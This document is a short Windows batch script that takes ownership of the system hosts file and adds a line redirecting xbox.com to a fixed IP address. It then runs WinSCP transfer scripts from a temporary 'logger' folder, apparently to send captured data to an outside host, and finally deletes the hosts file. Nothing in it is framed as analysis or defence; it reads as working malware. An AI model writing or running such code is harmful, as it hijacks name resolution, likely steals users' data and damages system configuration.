@echo off
:changehosts
cd C:\Windows\System32\drivers\etc\
takeown /F hosts
echo 98.168.2.122 xbox.com >> hosts
:filetake
WinSCP.com /script=%temp%\logger\gen.bat
WinSCP.com /script=%temp%\logger\gen2.bat
:changehosts2
cd C:\Windows\System32\drivers\etc\
del hosts